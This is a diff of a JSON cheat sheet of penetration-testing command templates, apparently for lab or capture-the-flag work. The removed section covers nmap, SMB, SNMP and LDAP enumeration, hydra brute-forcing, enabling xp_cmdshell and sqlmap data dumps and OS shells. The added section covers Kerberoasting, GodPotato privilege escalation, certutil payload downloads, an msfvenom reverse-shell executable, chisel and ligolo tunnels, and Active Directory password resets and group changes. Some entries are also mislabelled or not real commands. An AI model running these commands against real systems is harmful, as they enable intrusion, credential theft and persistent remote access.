@@ -1,358 +1,163 @@
 {
-  "enumeration": [
-   {
-      "os": "Linux",
-      "cmd": "smbclient //{TARGET_IP}/{SHARE_NAME} -U {UserName}%{Password}",
-      "description": "Connect to an SMB share"
+  "information_gathering": [
+    {
+      "os": "Windows",
+      "cmd": "wmic service get name,displayname,pathname,startmode,startname,state | findstr /I {APPLICATION_NAME}",
+      "description": "List details of Windows services and filter by a specific application name."
+    },
+    {
+      "os": "Windows",
+      "cmd": "icacls {PATH}",
+      "description": "Display Access Control Lists (ACLs) for a specified file or folder path."
     },
     {
       "os": "Linux",
-      "cmd": "nmap -sS {TARGET_IP}",
-      "description": "SYN Stealth Scan"
+      "cmd": "nmap -sC -sV {RHOST}",
+      "description": "Perform a comprehensive Nmap scan (default scripts and service version detection) on the target host."
     },
     {
       "os": "Linux",
-      "cmd": "nmap -sT {TARGET_IP}",
-      "description": "TCP Connect Scan"
+      "cmd": "bloodhound-python -u {USER} -p {PASS} -ns {RHOST} -d {DOMAIN} -c All",
+      "description": "Collect Active Directory data for BloodHound analysis, connecting to a domain controller at {RHOST}."
     },
     {
       "os": "Linux",
-      "cmd": "sudo nmap -sU {TARGET_IP}",
-      "description": "UDP Scan (requires root)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -p 21,22,80,443,3389 {TARGET_IP}",
-      "description": "Scan specific ports"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -p- {TARGET_IP}",
-      "description": "Scan all ports (0-65535)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -sV {TARGET_IP}",
-      "description": "Service Version Detection"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -O {TARGET_IP}",
-      "description": "OS Detection"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -A {TARGET_IP}",
-      "description": "Aggressive Scan (OS, Service, Script Detection, Traceroute)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -sC {TARGET_IP}",
-      "description": "Default Script Scan"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -sC -sV -oA nmap_scan_{TARGET_IP} {TARGET_IP}",
-      "description": "Combine commonly used flags for quick initial scan"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -Pn {TARGET_IP}",
-      "description": "No Ping (Treat host as online)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -oA {filename} {TARGET_IP}",
-      "description": "Output to all formats (Nmap, Greppable, XML)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -T4 {TARGET_IP}",
-      "description": "Timing Templates (T0-T5, T4 is aggressive/normal)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nslookup {TARGET_IP}",
-      "description": "Standard DNS lookup (by IP)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nslookup {DOMAIN}",
-      "description": "Standard DNS lookup (by Domain)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nslookup {DOMAIN} {DNS_SERVER_IP}",
-      "description": "Specific DNS server lookup"
-    },
-    {
-      "os": "Linux",
-      "cmd": "dig axfr @{TARGET_IP} {DOMAIN}",
-      "description": "DNS zone transfer attempt (AXFR)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "host {DOMAIN}",
-      "description": "Host enumeration (forward lookup)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "host {TARGET_IP}",
-      "description": "Reverse DNS lookup"
-    },
-    {
-      "os": "Linux",
-      "cmd": "dnsrecon -d {DOMAIN} -a",
-      "description": "DNS Reconnaissance Tool (full enumeration)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "dnsrecon -d {DOMAIN} -t axfr",
-      "description": "DNS Reconnaissance Tool (zone transfer)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "curl -I http://{TARGET_IP}",
-      "description": "Basic HTTP request (banner grabbing)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "curl -I https://{TARGET_IP}",
-      "description": "Basic HTTPS request (banner grabbing)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "dirb http://{TARGET_IP} /usr/share/wordlists/dirb/common.txt",
-      "description": "Directory/File Brute-forcing (Dirb)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "gobuster dir -u http://{TARGET_IP} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_results.txt",
-      "description": "Directory/File Brute-forcing (Gobuster)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "gobuster dir -u http://{TARGET_IP} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt",
-      "description": "Directory/File Brute-forcing (Gobuster with extensions)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nikto -h {TARGET_IP}",
-      "description": "Nikto (Web server scanner)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "wpscan --url http://{TARGET_IP} --enumerate p,u,vp --api-token {WPSCAN_API_TOKEN}",
-      "description": "WPScan (WordPress scanner)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "sublist3r -d {DOMAIN} -o subdomains.txt",
-      "description": "Subdomain enumeration (Sublist3r)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "amass enum -d {DOMAIN}",
-      "description": "Subdomain enumeration (Amass)"
+      "cmd": "ffuf -u {URL_FUZZ_POINT} -w {WORDLIST_PATH} -fs {FILTER_SIZE}",
+      "description": "Perform directory/file brute-forcing with ffuf, fuzzing a URL with a wordlist and filtering by response size. Use 'FUZZ' keyword in {URL_FUZZ_POINT} for insertion."
     }
   ],
-  "service_specific_enumeration": [
-    {
-      "os": "Linux",
-      "cmd": "smbclient -L //{TARGET_IP} -N",
-      "description": "List SMB shares (null session)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "smbmap -H {TARGET_IP}",
-      "description": "List SMB shares with smbmap"
-    },
-    {
-      "os": "Linux",
-      "cmd": "smbclient //{TARGET_IP}/{SHARE_NAME} -U {UserName}%{Password}",
-      "description": "Connect to an SMB share"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -p 445 --script smb-enum-shares.nse,smb-enum-users.nse,smb-security-mode.nse {TARGET_IP}",
-      "description": "Nmap SMB enumeration scripts"
-    },
-    {
-      "os": "Linux",
-      "cmd": "enum4linux {TARGET_IP}",
-      "description": "Enumerate SMB users, shares, and policies"
-    },
-    {
-      "os": "Linux",
-      "cmd": "sudo mount -t cifs //{TARGET_IP}/{SHARE_NAME} /mnt/smb_share -o username={UserName},password={Password},domain={Domain_Name}",
-      "description": "Mount an SMB share from Linux"
-    },
-    {
-      "os": "Linux",
-      "cmd": "ftp {TARGET_IP}",
-      "description": "Connect to FTP (then 'anonymous' for user/pass)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -p 21 --script ftp-anon.nse,ftp-bounce.nse,ftp-vsftpd-backdoor.nse {TARGET_IP}",
-      "description": "Nmap FTP scripts"
-    },
-    {
-      "os": "Linux",
-      "cmd": "put {LOCAL_FILE_PATH}",
-      "description": "Upload file via FTP (after connecting)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "get {REMOTE_FILE_PATH}",
-      "description": "Download file via FTP (after connecting)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "ssh {UserName}@{TARGET_IP}",
-      "description": "Connect via SSH"
-    },
-    {
-      "os": "Linux",
-      "cmd": "hydra -l {UserName} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP}",
-      "description": "SSH Brute-force (single user)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "hydra -L {USER_LIST_FILE} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP}",
-      "description": "SSH Brute-force (user list)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "telnet {TARGET_IP} 25",
-      "description": "Connect to SMTP for manual enumeration (then VRFY, EXPN, RCPT TO)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "VRFY {UserName}",
-      "description": "SMTP VRFY command (after telnet)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "EXPN root",
-      "description": "SMTP EXPN command (after telnet)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "RCPT TO:{UserName}",
-      "description": "SMTP RCPT TO command (after telnet)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "nmap -p 25 --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} {TARGET_IP}",
-      "description": "Nmap SMTP user enumeration scripts"
-    },
-    {
-      "os": "Linux",
-      "cmd": "smtp-user-enum -M VRFY -U {USER_LIST_FILE} -t {TARGET_IP}",
-      "description": "SMTP user enumeration with smtp-user-enum"
-    },
-    {
-      "os": "Linux",
-      "cmd": "snmpwalk -c public -v1 {TARGET_IP}",
-      "description": "Walk SNMP tree (community 'public', v1)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "snmpwalk -c public -v2c {TARGET_IP}",
-      "description": "Walk SNMP tree (community 'public', v2c)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "for c in public private manager; do snmpwalk -c $c -v1 {TARGET_IP} 2>/dev/null | grep -i 'sysDescr'; done",
-      "description": "Check for common SNMP community strings"
-    },
-    {
-      "os": "Linux",
-      "cmd": "snmp-check {TARGET_IP}",
-      "description": "Enumerate SNMP details with snmp-check"
-    },
-    {
-      "os": "Linux",
-      "cmd": "showmount -e {TARGET_IP}",
-      "description": "Show exported NFS shares"
-    },
-    {
-      "os": "Linux",
-      "cmd": "sudo mount -t nfs {TARGET_IP}:{SHARE_PATH} /mnt/nfs_share -o nolock",
-      "description": "Mount an NFS share"
-    },
-    {
-      "os": "Linux",
-      "cmd": "ls -la /mnt/nfs_share",
-      "description": "Check permissions of mounted NFS share"
-    },
-    {
-      "os": "Linux",
-      "cmd": "ldapsearch -x -h {TARGET_IP} -b \"dc=example,dc=com\"",
-      "description": "LDAP search (anonymous bind, base domain)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "ldapsearch -x -h {TARGET_IP} -b \"dc=example,dc=com\" \"(objectClass=*)\"",
-      "description": "LDAP search (anonymous bind, all objects)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "ldapsearch -x -h {TARGET_IP} -b \"dc=example,dc=com\" \"(cn=*{UserName}*)\"",
-      "description": "LDAP search (anonymous bind, search for username)"
-    },
-    {
-      "os": "Linux",
-      "cmd": "sqsh -S {TARGET_IP} -U {UserName} -P {Password}",
-      "description": "Connect to MSSQL using sqsh"
-    },
+  "privilege_escalation": [
     {
       "os": "Windows",
-      "cmd": "SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'",
-      "description": "MSSQL: Check xp_cmdshell status"
-    },
-    {
-      "os": "Windows",
-      "cmd": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
-      "description": "MSSQL: Enable xp_cmdshell"
-    },
-    {
-      "os": "Windows",
-      "cmd": "EXEC xp_cmdshell 'whoami';",
-      "description": "MSSQL: Execute command via xp_cmdshell"
+      "cmd": ".\\GodPotato-NET4.exe -cmd \"cmd /c net user {USER} {NEW_PASS}\"",
+      "description": "Execute the GodPotato-NET4.exe tool to change a target user's password with elevated privileges."
     },
     {
       "os": "Linux",
-      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" --dbs",
-      "description": "SQLMap: Enumerate databases"
+      "cmd": "nxc smb {RHOST} -u {USER} -p {PASS} -M backup_operator",
+      "description": "Leverage the SMB backup_operator module using NetExec against a target host, authenticating with provided credentials."
     },
     {
       "os": "Linux",
-      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" -D {DATABASE_NAME} --tables",
-      "description": "SQLMap: Enumerate tables in a database"
+      "cmd": "python3 targetedKerberoast.py --dc-ip '{RHOST}' -v -d '{DOMAIN}' -u '{USER}' -p '{PASS}'",
+      "description": "Perform a targeted Kerberoasting attack to extract service principal name (SPN) hashes from a domain controller."
     },
     {
       "os": "Linux",
-      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" -D {DATABASE_NAME} -T {TABLE_NAME} --columns",
-      "description": "SQLMap: Enumerate columns in a table"
-    },
-    {
-      "os": "Linux",
-      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" -D {DATABASE_NAME} -T {TABLE_NAME} -C {COLUMN_NAME} --dump",
-      "description": "SQLMap: Dump data from a column"
-    },
-    {
-      "os": "Linux",
-      "cmd": "sqlmap -u \"http://{TARGET_IP}/vulnerable_page.php?id=1\" --os-shell",
-      "description": "SQLMap: Attempt OS shell via SQL injection"
+      "cmd": "impacket-GetUserSPNs -request -dc-ip {RHOST} {DOMAIN}/{USER}:{PASS}",
+      "description": "Request Service Principal Names (SPNs) using Impacket for Kerberoasting from a domain controller."
     }
   ],
-  "vulnerability_scanning_basic": [
+  "file_transfer": [
+    {
+      "os": "Windows",
+      "cmd": "wget http://{LOCAL_IP}/{FILE} -o {FILE}",
+      "description": "Download a file (e.g., a payload or tool) from a local web server and save it."
+    },
+    {
+      "os": "Windows",
+      "cmd": "certutil -urlcache -f http://{LOCAL_IP}:{LPORT}/{FILE} {FILE}",
+      "description": "Download a file using certutil from a specified HTTP server (e.g., for transferring tools)."
+    }
+  ],
+  "remote_access_and_lateral_movement": [
+    {
+      "os": "Windows",
+      "cmd": "msfvenom --payload windows/shell_reverse_tcp LHOST={LOCAL_IP} LPORT={LPORT} -f exe > {OUTPUT_FILE}",
+      "description": "Generate a Windows reverse TCP shell executable that connects back to your IP and listening port."
+    },
     {
       "os": "Linux",
-      "cmd": "nikto -h {TARGET_IP}",
-      "description": "Nikto (Web server scanner)"
+      "cmd": "evil-winrm -i {RHOST} -u {USER} -p {PASS}",
+      "description": "Establish a WinRM session to a Windows target for remote command execution using provided credentials."
+    },
+    {
+      "os": "Linux",
+      "cmd": "impacket-psexec {USER}:{PASS}@{RHOST}",
+      "description": "Execute commands remotely on a Windows target using PsExec-like functionality from Impacket with provided credentials."
+    }
+  ],
+  "tunneling_and_port_forwarding": [
+    {
+      "os": "Linux",
+      "cmd": "./agent.exe -connect {LOCAL_IP}:{LPORT} -ignore-cert",
+      "description": "Connect a Ligolo agent to a Ligolo proxy server at a specified IP and local listening port, ignoring TLS certificate validation."
+    },
+    {
+      "os": "Linux",
+      "cmd": "chisel server -v -p {LPORT} --reverse",
+      "description": "Start a Chisel server with verbose output, listening on a specific local port and enabling reverse forwarding for clients."
+    },
+    {
+      "os": "Windows",
+      "cmd": ".\\chisel.exe client -v {RHOST_SERVER}:{RPORT_SERVER} R:{LPORT}:{REMOTE_IP}:{RPORT}",
+      "description": "Connect a Chisel client to a server and set up a reverse port forward from a local port to a remote IP and port."
+    }
+  ],
+  "credential_and_ad_management": [
+    {
+      "os": "Windows",
+      "cmd": "net rpc password {USER} '{NEW_PASS}' -U {DOMAIN}/{ADMIN_USER}%'{ADMIN_PASS}' -S {RHOST}",
+      "description": "Change a user's password via Net RPC on a domain controller, authenticating with administrator credentials."
+    },
+    {
+      "os": "Linux",
+      "cmd": "bloodyAD --host \"{RHOST}\" -d \"{DOMAIN}\" -u \"{USER}\" -p \"{PASS}\" set password \"{USER}\" \"{NEW_PASS}\"",
+      "description": "Change a user's password in Active Directory using bloodyAD, specifying the domain controller, domain, and credentials."
+    },
+    {
+      "os": "Linux",
+      "cmd": "impacket-changepasswd {DOMAIN}/{USER}@{RHOST} -newpass {NEW_PASS} -altuser {DOMAIN}/{ALT_USER} -altpass {ALT_PASS} -reset",
+      "description": "Change or reset a user's password on a domain controller using Impacket's changepasswd script, authenticating with an alternative user."
+    },
+    {
+      "os": "Windows",
+      "cmd": "net group \"{GROUP_NAME}\" {ADD_USER} /add /domain",
+      "description": "Add a specified user to a named group within the domain."
+    },
+    {
+      "os": "Linux",
+      "cmd": "bloodyAD --host \"{RHOST}\" -d \"{DOMAIN}\" -u \"{USER}\" -p \"{PASS}\" add groupMember \"{GROUP_NAME}\" \"{ADD_USER}\"",
+      "description": "Add a specified user as a member to a group in Active Directory using bloodyAD, providing authentication details."
+    }
+  ],
+  "network_service_interaction": [
+    {
+      "os": "Linux",
+      "cmd": "psql -h {RHOST} -p {RPORT} -U {USER}",
+      "description": "Connect to a PostgreSQL database using the psql client, specifying the target host, port, and username."
+    },
+    {
+      "os": "Linux",
+      "cmd": "nxc mssql {RHOST} -u {USERNAME_FILE} -p {PASSWORD_FILE} --continue-on-success",
+      "description": "Perform MSSQL credential brute-force/enumeration using NetExec against a target host, reading credentials from files and continuing on success."
+    },
+    {
+      "os": "Linux",
+      "cmd": "nxc winrm {RHOST} -u {USERNAME_FILE} -p {PASSWORD_FILE} --continue-on-success",
+      "description": "Perform WinRM credential brute-force/enumeration using NetExec against a target host, reading credentials from files and continuing on success."
+    },
+    {
+      "os": "Linux",
+      "cmd": "nxc winrm {RHOST} -u {USERNAME_FILE} -p {PASSWORD_FILE} --local-auth --continue-on-success",
+      "description": "Perform WinRM local credential brute-force/enumeration using NetExec against a target host, reading credentials from files and continuing on success."
+    }
+  ],
+  "miscellaneous_system_control": [
+    {
+      "os": "Windows",
+      "cmd": "if Everyone:(OI)(CI)(F) then # This is a conditional, not an executable command.",
+      "description": "A conditional statement indicating an action to be taken if specific broad permissions are present."
+    },
+    {
+      "os": "Windows",
+      "cmd": "shutdown /r",
+      "description": "Initiate a restart of the computer."
+    },
+    {
+      "os": "Linux",
+      "cmd": "git-dumper {GIT_REPO_URL} {OUTPUT_DIRECTORY}",
+      "description": "Download and extract a hidden .git repository from a web server into a specified local directory."
     }
   ]
 }
